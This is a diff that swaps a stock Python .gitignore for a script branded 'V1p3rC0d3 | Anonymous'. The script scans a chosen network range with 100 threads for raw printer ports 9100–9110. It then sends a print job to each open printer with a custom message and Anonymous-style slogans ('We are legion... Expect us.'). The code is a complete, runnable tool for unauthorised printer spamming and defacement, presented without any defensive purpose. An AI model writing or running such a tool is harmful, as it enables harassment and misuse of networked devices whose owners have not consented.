@@ -1,194 +1,133 @@
-# Byte-compiled / optimized / DLL files
-__pycache__/
-*.py[cod]
-*$py.class
+import socket
+import threading
+from queue import Queue
+from tqdm import tqdm
+import pyfiglet
+from colorama import Fore, Style, init
 
-# C extensions
-*.so
+# Initialize colorama (auto-reset colors)
+init(autoreset=True)
 
-# Distribution / packaging
-.Python
-build/
-develop-eggs/
-dist/
-downloads/
-eggs/
-.eggs/
-lib/
-lib64/
-parts/
-sdist/
-var/
-wheels/
-share/python-wheels/
-*.egg-info/
-.installed.cfg
-*.egg
-MANIFEST
+# === Configuration ===
+PORTS = list(range(9100, 9111))  # Printer ports 9100–9110
+TIMEOUT = 1
+MAX_THREADS = 100
 
-# PyInstaller
-#  Usually these files are written by a python script from a template
-#  before PyInstaller builds the exe, so as to inject date/other infos into it.
-*.manifest
-*.spec
+# === Global variables ===
+task_queue = Queue()
+send_queue = Queue()
+printers_found = {}
+lock = threading.Lock()
+progress_lock = threading.Lock()
+scanned_count = 0
 
-# Installer logs
-pip-log.txt
-pip-delete-this-directory.txt
+# === Colors ===
+HEADER_COLOR = Fore.MAGENTA + Style.BRIGHT
+SCAN_COLOR = Fore.YELLOW
+SUCCESS_COLOR = Fore.GREEN
+ERROR_COLOR = Fore.RED
+INFO_COLOR = Fore.CYAN
+RESET = Style.RESET_ALL
 
-# Unit test / coverage reports
-htmlcov/
-.tox/
-.nox/
-.coverage
-.coverage.*
-.cache
-nosetests.xml
-coverage.xml
-*.cover
-*.py,cover
-.hypothesis/
-.pytest_cache/
-cover/
 
-# Translations
-*.mo
-*.pot
+def print_banner():
+    banner = pyfiglet.figlet_format("V1p3rC0d3 | Anonymous", font="slant")
+    print(f"{HEADER_COLOR}{banner}{RESET}")
 
-# Django stuff:
-*.log
-local_settings.py
-db.sqlite3
-db.sqlite3-journal
 
-# Flask stuff:
-instance/
-.webassets-cache
+def scan_ip(ip):
+    global scanned_count
+    open_ports = []
 
-# Scrapy stuff:
-.scrapy
+    for port in PORTS:
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.settimeout(TIMEOUT)
+                if sock.connect_ex((ip, port)) == 0:
+                    open_ports.append(port)
+        except Exception:
+            pass
 
-# Sphinx documentation
-docs/_build/
+    if open_ports:
+        with lock:
+            printers_found[ip] = open_ports
+            print(f"{SUCCESS_COLOR}✅ {ip} → open ports: {open_ports}{RESET}")
+            for port in open_ports:
+                send_queue.put((ip, port))
 
-# PyBuilder
-.pybuilder/
-target/
+    with progress_lock:
+        scanned_count += 1
 
-# Jupyter Notebook
-.ipynb_checkpoints
 
-# IPython
-profile_default/
-ipython_config.py
+def worker():
+    while not task_queue.empty():
+        ip = task_queue.get()
+        scan_ip(ip)
+        task_queue.task_done()
 
-# pyenv
-#   For a library or package, you might want to ignore these files since the code is
-#   intended to run in multiple environments; otherwise, check them in:
-# .python-version
 
-# pipenv
-#   According to pypa/pipenv#598, it is recommended to include Pipfile.lock in version control.
-#   However, in case of collaboration, if having platform-specific dependencies or dependencies
-#   having no cross-platform support, pipenv may install dependencies that don't work, or not
-#   install all needed dependencies.
-#Pipfile.lock
+def send_print(ip, port, message):
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.settimeout(2)
+            sock.connect((ip, port))
+            payload = (
+                f"\n{message}\n"
+                "----------------------------\n"
+                "𝕎𝕖 𝕒𝕣𝕖 𝔸𝕟𝕠𝕟𝕪𝕞𝕠𝕦𝕤. 𝕎𝕖 𝕒𝕣𝕖 𝕝𝕖𝕘𝕚𝕠𝕟.\n"
+                "𝕎𝕖 𝕕𝕠 𝕟𝕠𝕥 𝔣𝕠𝕣𝕘𝕚𝕧𝕖. 𝕎𝕖 𝕕𝕠 𝕟𝕠𝕥 𝕗𝕠𝕣𝕘𝕖𝕥.\n"
+                "𝔼𝕩𝕡𝕖𝕔𝕥 𝕦𝕤.\n"
+                f"{ip}:{port}\n"
+                "----------------------------\n"
+            )
+            sock.sendall(payload.encode("utf-8"))
+            print(f"{INFO_COLOR}🖨️  Sent to {ip}:{port}{RESET}")
+    except Exception as e:
+        print(f"{ERROR_COLOR}❌ Error on {ip}:{port} → {e}{RESET}")
 
-# UV
-#   Similar to Pipfile.lock, it is generally recommended to include uv.lock in version control.
-#   This is especially recommended for binary packages to ensure reproducibility, and is more
-#   commonly ignored for libraries.
-#uv.lock
 
-# poetry
-#   Similar to Pipfile.lock, it is generally recommended to include poetry.lock in version control.
-#   This is especially recommended for binary packages to ensure reproducibility, and is more
-#   commonly ignored for libraries.
-#   https://python-poetry.org/docs/basic-usage/#commit-your-poetrylock-file-to-version-control
-#poetry.lock
+def main():
+    global scanned_count
 
-# pdm
-#   Similar to Pipfile.lock, it is generally recommended to include pdm.lock in version control.
-#pdm.lock
-#   pdm stores project-wide configurations in .pdm.toml, but it is recommended to not include it
-#   in version control.
-#   https://pdm.fming.dev/latest/usage/project/#working-with-version-control
-.pdm.toml
-.pdm-python
-.pdm-build/
+    print_banner()
 
-# PEP 582; used by e.g. github.com/David-OConnor/pyflow and github.com/pdm-project/pdm
-__pypackages__/
+    print(f"{HEADER_COLOR}📡 Network Printer Scanner (Ports 9100–9110){RESET}")
+    prefix = input(f"{SCAN_COLOR}Network prefix (e.g., 192.168.1): {RESET}").strip()
+    start = int(input(f"{SCAN_COLOR}Start IP (e.g., 1): {RESET}"))
+    end = int(input(f"{SCAN_COLOR}End IP (e.g., 254): {RESET}"))
+    message = input(f"{SCAN_COLOR}Message to print: {RESET}")
 
-# Celery stuff
-celerybeat-schedule
-celerybeat.pid
+    # Populate scanning queue
+    for i in range(start, end + 1):
+        task_queue.put(f"{prefix}.{i}")
 
-# SageMath parsed files
-*.sage.py
+    print(f"\n{INFO_COLOR}🧵 Starting scan with {MAX_THREADS} threads...\n{RESET}")
 
-# Environments
-.env
-.venv
-env/
-venv/
-ENV/
-env.bak/
-venv.bak/
+    # Start scanning threads
+    for _ in range(MAX_THREADS):
+        threading.Thread(target=worker, daemon=True).start()
 
-# Spyder project settings
-.spyderproject
-.spyproject
+    # Progress bar for scanning
+    with tqdm(total=task_queue.qsize(), desc=f"{SCAN_COLOR}Scanning IPs{RESET}") as pbar:
+        last_count = 0
+        while scanned_count < task_queue.qsize():
+            with progress_lock:
+                diff = scanned_count - last_count
+                last_count = scanned_count
+            pbar.update(diff)
+            threading.Event().wait(0.1)
 
-# Rope project settings
-.ropeproject
+    task_queue.join()
 
-# mkdocs documentation
-/site
+    if printers_found:
+        print(f"\n{INFO_COLOR}🚀 Sending print jobs to {len(printers_found)} printers...\n{RESET}")
+        while not send_queue.empty():
+            ip, port = send_queue.get()
+            send_print(ip, port, message)
+            send_queue.task_done()
+    else:
+        print(f"{ERROR_COLOR}\n⚠️ No printers found.{RESET}")
 
-# mypy
-.mypy_cache/
-.dmypy.json
-dmypy.json
 
-# Pyre type checker
-.pyre/
-
-# pytype static type analyzer
-.pytype/
-
-# Cython debug symbols
-cython_debug/
-
-# PyCharm
-#  JetBrains specific template is maintained in a separate JetBrains.gitignore that can
-#  be found at https://github.com/github/gitignore/blob/main/Global/JetBrains.gitignore
-#  and can be added to the global gitignore or merged into this file.  For a more nuclear
-#  option (not recommended) you can uncomment the following to ignore the entire idea folder.
-#.idea/
-
-# Abstra
-# Abstra is an AI-powered process automation framework.
-# Ignore directories containing user credentials, local state, and settings.
-# Learn more at https://abstra.io/docs
-.abstra/
-
-# Visual Studio Code
-#  Visual Studio Code specific template is maintained in a separate VisualStudioCode.gitignore 
-#  that can be found at https://github.com/github/gitignore/blob/main/Global/VisualStudioCode.gitignore
-#  and can be added to the global gitignore or merged into this file. However, if you prefer, 
-#  you could uncomment the following to ignore the enitre vscode folder
-# .vscode/
-
-# Ruff stuff:
-.ruff_cache/
-
-# PyPI configuration file
-.pypirc
-
-# Cursor
-#  Cursor is an AI-powered code editor. `.cursorignore` specifies files/directories to
-#  exclude from AI features like autocomplete and code analysis. Recommended for sensitive data
-#  refer to https://docs.cursor.com/context/ignore-files
-.cursorignore
-.cursorindexingignore
+if __name__ == "__main__":
+    main()
